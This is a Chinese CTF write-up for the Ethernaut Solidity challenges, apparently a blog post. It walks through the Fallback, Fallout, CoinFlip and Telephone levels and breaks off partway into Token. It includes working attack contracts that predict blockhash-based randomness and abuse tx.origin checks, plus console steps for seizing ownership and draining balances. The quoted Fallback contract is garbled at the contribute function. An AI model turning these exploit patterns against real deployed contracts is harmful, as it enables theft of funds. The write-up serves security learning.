>
> 最近尝试在做Ethernaut上面的题目，也在网上搜到了一些过去别人写的题解。但问题在于，随着时间发展，目前有些题目的合约代码已经更新，有些题目引入库合约的代码地址发生变化，还有重入题目中存入余额与之前有所不同，过去的wp中某些题目的题解不能复现。针对这些问题，我修改了一些题解并尽可能详细地解释其中漏洞产生的原理，内容如下。
# 1\. Fallback
合约如下
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
    contract Fallback {
      using SafeMath for uint256;
      mapping(address => uint) public contributions;
      address payable public owner;
      constructor() public {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
      }
      modifier onlyOwner {
            require(
                msg.sender == owner,
                "caller is not the owner"
            );
            _;
        }
      function contribute() public payable {
        require(msg.value  contributions[owner]) {
          owner = msg.sender;
        }
      }
      function getContribution() public view returns (uint) {
        return contributions[msg.sender];
      }
      function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
      }
      receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
      }
    }
注意题目中给出的`SafeMath.sol`地址已不能引用，可以用上面的路径。  
可以通过`contribute`函数提高用户在`contributions`数组的值，用户可以使用`getContribution`函数获取到当前的contributions数组的内容。注意到有个`receive`函数，解释一下
> 每个合约最多有一个receive函数，这个receive函数使用`receive() external payable { ...
> }`的方式声明（没有function关键字），这个函数不能有参数，并且不能返回任何东西，必须有`external`可见度和`payable`状态可变性。这个函数可以是virtual的，可以被重写并且可以使用modifiers。
>
>
> 当合约收到一个calldata为空的call时，receive函数会被调用。这个函数会在执行一些以太币转账操作时被执行，常见的以太币转账操作包括`.send()`、`.transfer()`函数发起的转账。如果没有receive函数存在，但是存在一个payable属性的fallback函数的话，这个fallback函数会在一次以太币转账中被调用。如果一个合约既没有receive函数也没有payable属性的fallback函数，那么这个合约不能通过常规的交易来接收以太币，并且会抛出一个异常。
而在本题中，可以看到，如果满足require中的条件，receive函数将本合约的owner变成了msg.sender，再通过`withdraw`函数提取合约中的所有余额，即可完成攻击。所有攻击步骤如下：
  1. 首先向合约中充值一定数量的以太币，在控制台执行`contract.contribute({value:1})`,保证满足`contributions[msg.sender]>0`
  2. 然后向合约对应地址转账1个以太币，触发receive函数，这里可以使用metamask转账
  3. 转账完成后查看合约的owerner，可以看到已经变成攻击者的地址，最后调用`withdraw`函数，取出合约中的所有余额，完成攻击。
# 2.Fallout
合约如下
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    // import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol';
    import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
    contract Fallout {
      using SafeMath for uint256;
      mapping (address => uint) allocations;
      address payable public owner;
      function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
      }
      modifier onlyOwner {
                require(
                    msg.sender == owner,
                    "caller is not the owner"
                );
                _;
            }
      function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
      }
      function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
      }
      function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
      }
      function allocatorBalance(address allocator) public view returns (uint) {
        return allocations[allocator];
      }
    }
  1. `contract.Fal1out()`调用从而使得owner变成攻击者的地址
  2. 然后直接调用`collectAllocations`函数拿下
这个题想说明的是，构造函数是无法直接调用的，而本题中作者故意写成`Fal1out`注意中间是1，使得该函数不是构造函数，于是可以全局调用。
# 3\. CoinFlip
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    // import '@openzeppelin/contracts/math/SafeMath.sol';
    import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
    contract CoinFlip {
      using SafeMath for uint256;
      uint256 public consecutiveWins;
      uint256 lastHash;
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
      constructor() public {
        consecutiveWins = 0;
      }
      function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        if (lastHash == blockValue) {
          revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        if (side == _guess) {
          consecutiveWins++;
          return true;
        } else {
          consecutiveWins = 0;
          return false;
        }
      }
    }
这里解释一下，`block.number`可以用来获取当前交易对应block的编号，而这里减1获取的就是前一个block的编号，而blockhash(id)可以获取对应id的block的hash值，对应形式类似`0x0ac2bf40a6d661df20bbe1e61c73c0c247215f172053b9fc8af4bff15b94085b`这样，然后uint256将其转换为16进制对应的数值。其中给的factor就是$2^{256}/2$，所以每次做完除法的结果有一半几率是0，一半是1。
  * 本题考察点在于，上述这种通过`block.blockhash(block.number - 1)`获取负一高度的区块hash来生成随机数的方式是极易被攻击利用的。
  * 原理是在区块链中，一个区块包含多个交易，我们可以先运行一下上述除法计算的过程获取结果究竟是0还是1，然后再发送对应的结果过去，区块链中块和快之前的间隔大概有10秒，手动去做会有问题，而且不能保证我们计算的合约是否和题目运算调用在同一个block上，因此需要写一个攻击合约完成调用。我们在攻击合约中调用题目中的合约，可以保证两个交易一定被打包在同一个区块上，因此它们获取的`block.number.sub(1)`是一样的，攻击合约代码如下:
        // SPDX-License-Identifier: MIT
      pragma solidity ^0.6.0;
      import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
      interface CoinFlip{
        function flip(bool _guess) external returns (bool);//这里函数可见性要改成external
      }
      contract attack {
        using SafeMath for uint256;
        uint256 public consecutiveWins;
        uint256 lastHash;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        address targetAddress =0xBC69893DE012e1949285b4c04e643E6f7958682C;//改成要攻击地址
        CoinFlip c;
        function exp() public returns (bool) {
          uint256 blockValue = uint256(blockhash(block.number.sub(1)));
          if (lastHash == blockValue) {
            revert();
          }
          lastHash = blockValue;
          uint256 coinFlip = blockValue.div(FACTOR);
          bool side = coinFlip == 1 ? true : false;
          c = CoinFlip(targetAddress);
          c.flip(side);
        }
      }
remix选择injected web3，使用metamask账户连接到Rinkeby测试网上，部署上述代码然后点击10次exp函数即可。
# 4\. Telephone
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract Telephone {
      address public owner;
      constructor() public {
        owner = msg.sender;
      }
      function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
          owner = _owner;
        }
      }
    }
这道题需要了解`tx.origin`和`msg.sender`的区别。假设A、B、C都是已经部署的合约，如果我们用A去调用C，即A->C，那么在C合约看来，A既是`tx.origin`，又是`msg.sender`。如果调用链是A->B->C，那么对于合约C来说，A是`tx.origin`，B是`msg.sender`，即`msg.sender`是直接调用的一方，而`tx.origin`是交易的原始发起者，和英文也对应着。因此本题直接外部部署合约调用changeOwner函数即可完成。攻击代码如下：
    pragma solidity ^0.4.11;
    interface Telephone {
        function changeOwner(address _owner) external;
    }
    contract exploit {
        address targetAddr;
        Telephone t;
        address myaddr;
        function setInstance(address _targetAddr,address _myaddr) public {
          targetAddr=_targetAddr;
          myaddr= _myaddr;
        }
        function exp () public {
            t = Telephone(targetAddr);
            t.changeOwner(myaddr);
        }
    }
倒是搜索的时候可以搜到针对条件为`require(tx.origin ==
owner);`的攻击，参考[这里](https://blog.csdn.net/wo541075754/article/details/96445470)
# 5\. Token
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract Token {
      mapping(address => uint) balances;
      uint public totalSupply;
      constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
      }
      function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
      }
      function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];